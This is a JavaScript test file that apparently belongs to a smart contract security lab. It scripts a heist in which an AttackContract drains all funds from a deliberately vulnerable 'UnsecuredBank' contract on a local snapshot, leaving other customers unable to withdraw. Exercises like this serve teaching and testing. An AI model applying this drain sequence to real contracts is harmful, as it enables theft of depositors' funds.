const { expect } = require('chai');
const { fromWei, toWei } = require('web3-utils');

const UnsecuredBank = artifacts.require('UnsecuredBank');
const TokenAsset = artifacts.require('TokenAsset');
const AttackContract = artifacts.require('AttackContract');

const time = require('../../helpers/time');
const { assertRevert } = require('../../helpers/evm_revert');

const contractAddresses = require('../../snapshot_data/contract_addresses.json');
const { bankDeployAdmin, player } = require('../../snapshot_data/participants.json');

contract('Hack the UnsecuredBank', function() {
  let bankContract;
  let tokenContract;

  let attackContract;

  const PLAYER_INIT_BANK_BALANCE = 500000;
  let BANK_TOTAL_FUND_SUPPLY;

  let playerInitBankBalance;
  let playerInitTokenBalance;

  before(async function() {
    this.snapshotId = await time.takeSnapshot();
    bankContract = await UnsecuredBank.at(contractAddresses.UnsecuredBank);
    tokenContract = await TokenAsset.at(contractAddresses.TokenAsset);
    attackContract = await AttackContract.at(contractAddresses.AttackContract);

    BANK_TOTAL_FUND_SUPPLY = Number(fromWei(await tokenContract.totalSupply()));
  });

  after(async function() {
    await time.revertToSnapshot(this.snapshotId.result);
  });

  it('AttackContract initially has token balance is 0', async function() {
    const initBalance = Number(fromWei(await tokenContract.balanceOf(attackContract.address)));
    playerInitTokenBalance = Number(fromWei(await tokenContract.balanceOf(player)));
    playerInitBankBalance = Number(fromWei(await bankContract.balanceOf(player)));

    expect(initBalance).to.be.equal(0);
  });

  it('Player (Attacker) withdraws whole his balance from Bank', async function() {
    await bankContract.withdraw(toWei(String(playerInitBankBalance)), { from: player });
    const playerTokenBalance = Number(fromWei(await tokenContract.balanceOf(player)));
    expect(playerTokenBalance).to.be.equal(PLAYER_INIT_BANK_BALANCE);
  });

  it('Player (Attacker) transfer tokens to AttackContract', async function() {
    await tokenContract.transfer(attackContract.address, await tokenContract.balanceOf(player), {
      from: player,
    });
    const attackContractTokenBalance = Number(fromWei(await tokenContract.balanceOf(attackContract.address)));
    expect(attackContractTokenBalance).to.be.equal(PLAYER_INIT_BANK_BALANCE);
  });

  it('AttackContract deposit money to Bank', async function() {
    await attackContract.depositToBank({ from: player });
    const attackContractBankBalance = Number(fromWei(await bankContract.balanceOf(attackContract.address)));
    const attackContractTokenBalance = Number(fromWei(await tokenContract.balanceOf(attackContract.address)));

    expect(attackContractBankBalance).to.be.equal(PLAYER_INIT_BANK_BALANCE);
    expect(attackContractTokenBalance).to.be.equal(0);
  });

  it('[!!!] AttackContract trigger the heist by making withdrawal request', async function() {
    const attackContractTokenBalBefore = Number(fromWei(await tokenContract.balanceOf(attackContract.address)));

    // Attack make a withdrawal request with whole his balance, much lower than total bank supply
    await attackContract.triggerAttack(toWei(String(PLAYER_INIT_BANK_BALANCE)), { from: player });

    const attackContractTokenBalAfter = Number(fromWei(await tokenContract.balanceOf(attackContract.address)));
    // But it received whole funds from bank to its balance
    const change = attackContractTokenBalAfter - attackContractTokenBalBefore;
    expect(change).to.be.equal(BANK_TOTAL_FUND_SUPPLY);
  });

  it("Emptied Bank's balance after the heist", async function() {
    const remain = Number(fromWei(await tokenContract.balanceOf(bankContract.address)));
    expect(remain).to.be.equal(0);
  });

  it('Attacker get all funds from Bank to his wallet', async function() {
    await attackContract.withdraw({ from: player });

    const attackerBalanceAfter = Number(fromWei(await tokenContract.balanceOf(player)));
    expect(attackerBalanceAfter).to.be.equal(BANK_TOTAL_FUND_SUPPLY);
  });

  it("The other Bank's customer can not withdraw because their vault is emptied", async function() {
    const customerBankBalance = Number(fromWei(await bankContract.balanceOf(bankDeployAdmin)));
    await assertRevert(bankContract.withdraw(toWei(String(customerBankBalance)), { from: bankDeployAdmin }));
    // Meanwhile his balance still greater than 0
    expect(customerBankBalance).to.be.above(0);
  });
});
